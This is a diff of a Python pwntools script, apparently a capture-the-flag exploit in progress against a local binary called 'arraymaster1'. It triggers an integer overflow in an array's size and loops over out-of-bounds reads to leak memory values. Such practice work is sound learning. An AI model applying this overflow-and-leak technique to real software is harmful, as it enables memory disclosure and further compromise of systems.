@@ -2,7 +2,7 @@ from pwn import *
 
 p=process('./arraymaster1')
 e=ELF('./arraymaster1')
-#pause()
+pause()
 
 def list_info(p):
     p.recvuntil('\n> ')
@@ -20,7 +20,7 @@ def delete(p,a):
     log.info('[DELETE ARR] <{}>'.format(a))
 
 
-def set(p,a,b,c):
+def set_(p,a,b,c):
     p.recvuntil('\n> ')
     p.sendline('set {} {} {}'.format(a,b,c))
     log.info('[SET VALUE] ARR<{}> index<{}> val<{}>')
@@ -34,8 +34,17 @@ def get(p,a,b):
 def quit(p):
     p.recvuntil('\n> ')
     p.sendline('quit')
-init(p,'A',64,0xffffffdis)
-list_info(p)
+
+
+init(p,'A',64,(0xffffffffffffffff+1)/8)
+init(p,'B',64,10)
+#for i in range(1):
+set_(p,'A',1,123)
+set_(p,'B',1,456)
+for i in range(20):
+ print '[idx]: {}'.format(i)
+ log.info('[LEAKED]: '+hex(int(get(p,'B',i),16)))
+ sleep(0.2)
 
 p.interactive()
              
